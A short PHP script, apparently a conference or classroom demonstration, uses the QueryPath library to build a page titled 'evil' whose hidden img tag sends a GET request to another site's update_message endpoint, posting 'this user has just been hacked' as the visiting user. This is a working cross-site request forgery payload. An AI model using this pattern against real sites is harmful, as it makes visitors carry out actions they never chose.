<?php
require './lib/QueryPath/QueryPath.php';

$html = qp(QueryPath::HTML_STUB)
  ->find('title')
  ->text('evil')
  ->find(':root body')
  ->append('<h1>I Just Tweeted Some Evil Thing</h1>')
  ->append('<img src="./y3vf.jpg" width="400px"/>')
  ->append('<img/>')
  ->find('img:last')
  ->attr('src', "http://sflive.lo/02.php?action=update_message&message=this+user+has+just+been+hacked+...")
  ->writeHtml();